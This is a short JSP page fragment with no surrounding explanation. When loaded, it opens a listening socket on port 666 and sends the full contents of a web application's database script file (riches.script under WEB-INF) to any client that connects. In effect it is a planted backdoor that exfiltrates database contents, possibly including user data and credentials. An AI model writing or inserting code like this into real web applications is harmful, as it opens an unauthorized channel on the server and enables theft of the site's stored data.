<%
  java.net.ServerSocket srvr = new java.net.ServerSocket(666);

  java.net.Socket skt = srvr.accept();
  java.io.File pf = new java.io.File("webapps\\riches\\WEB-INF\\database\\riches.script");
  if (pf.exists()) {
    java.io.PrintWriter p_out = new java.io.PrintWriter(skt.getOutputStream(), true);
    java.io.FileInputStream fi = new java.io.FileInputStream(pf);
    java.io.BufferedReader r = new java.io.BufferedReader(new java.io.InputStreamReader(fi));
    String data;
    while ((data = r.readLine()) != null) {
      p_out.print(data + "\n");
     }
     p_out.close();
  }
%>